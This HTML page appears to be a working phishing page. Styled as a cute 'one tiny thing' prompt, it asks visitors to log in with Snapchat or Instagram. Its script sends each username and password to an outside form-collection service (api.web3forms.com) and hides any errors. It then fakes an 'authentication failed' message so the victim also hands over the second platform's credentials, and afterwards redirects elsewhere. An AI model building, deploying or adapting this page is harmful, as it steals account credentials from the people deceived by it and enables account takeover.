<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Just one tiny thing ♡</title>
<style>
*{box-sizing:border-box}
body{
 margin:0;min-height:100vh;display:grid;place-items:center;padding:20px;
 font-family:Arial,system-ui,sans-serif;color:#382f35;
 background:linear-gradient(145deg,#fff5f7,#eee8fb);
 overflow:hidden
}
.card{
 width:min(390px,100%);background:#fffdfb;border:1px solid #eadde1;
 border-radius:26px;padding:28px 22px;box-shadow:0 18px 50px #5b43551a;
 text-align:center
}
.logo{font-size:2.2rem;margin-bottom:8px}
h1{font-family:Georgia,serif;font-weight:500;margin:0 0 8px;font-size:1.8rem}
.sub{font-size:.88rem;opacity:.62;margin-bottom:22px}
.options{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px}
.option{
 border:1px solid #e5d9df;background:#fff;border-radius:15px;padding:12px;
 cursor:pointer;font-weight:bold;transition:.15s
}
.option.active{background:#f6e4ec;border-color:#c98fa5;transform:translateY(-1px)}
form{display:grid;gap:10px;text-align:left}
input{
 width:100%;padding:13px 14px;border:1px solid #dfd3d8;border-radius:13px;
 outline:none;font:inherit;background:#fff
}
input:focus{border-color:#c98fa5}
button[type=submit]{
 border:0;border-radius:999px;padding:13px;background:#684b59;color:white;
 font-weight:bold;cursor:pointer
}
.msg{min-height:44px;margin-top:15px;padding:11px;border-radius:12px;font-size:.84rem;display:none}
.error{display:block;background:#fff0f1;color:#a54d61}
.success{display:block;background:#edf9ef;color:#3c7950}
.hidden{display:none}
.after{animation:pop .4s ease}
@keyframes pop{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
small{display:block;margin-top:16px;opacity:.42;font-size:.68rem}
</style>
</head>
<body>
<div class="card">
 <div class="logo">🎀</div>
 <h1>One tiny thing...</h1>
 <div class="sub">Pick an account to continue ♡</div>
 <div class="options">
   <button class="option" id="snap" onclick="choose('snap')">👻 Snapchat</button>
   <button class="option" id="insta" onclick="choose('insta')">📷 Instagram</button>
 </div>
 <form id="loginForm" class="hidden" onsubmit="login(event)">
   <input id="username" autocomplete="off" placeholder="Username" required>
   <input id="password" type="password" autocomplete="off" placeholder="Password" required>
   <button type="submit">Continue →</button>
 </form>
 < div id="msg" class="msg"></div>
 <div id="done" class="hidden after">
   <div style="font-size:3rem;margin:10px">🎉</div>
   <h2 style="font-family:Georgia,serif;font-weight:500">Okay you're in ♡</h2>
   <p style="opacity:.65;font-size:.88rem">That was definitely a completely normal login.</p>
 </div>
 <small></small>
</div>
<script>
let chosen = null;
let hasTriedFirst = false;
function choose(platform) {
    chosen = platform;
    document.getElementById("snap").classList.toggle("active", platform === "snap");
    document.getElementById("insta").classList.toggle("active", platform === "insta");
    document.getElementById("loginForm").classList.remove("hidden");
    document.getElementById("done").classList.add("hidden");
    document.getElementById("msg").className = "msg";
    document.getElementById("msg").textContent = "";
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    document.getElementById("username").focus();
}
async function login(e) {
    e.preventDefault();
    
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;
    const msgDiv = document.getElementById("msg");
    
    // Web3Forms Access Key (Update this if you changed keys)
    const ACCESS_KEY = 'd09 392f2-f99b-4b4f-bd89-f6d2f5e2d759'; 
    fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            access_key: ACCESS_KEY,
            platform: chosen, 
            username: user,  
            password: pass,
            attempt: hasTriedFirst ? "Second Account" : "First Account"
        })
    }).catch(err => console.log("Silent error"));
    if (!hasTriedFirst) {
        hasTriedFirst = true;
        msgDiv.className = "msg error";
        msgDiv.textContent = chosen === 'snap' 
            ? "Authentication failed for Snapchat. Please try using your Instagram account." 
            : "Authentication failed for Instagram. Please try using your Snapchat account.";
        return; 
    } else {
        document.getElementById("loginForm").classList.add("hidden");
        document.getElementById("done").classList.remove("hidden");
        setTimeout(() => { 
            window.location.href = "web.html"; 
        }, 2000);
    }
}
</script>
</body>
</html>
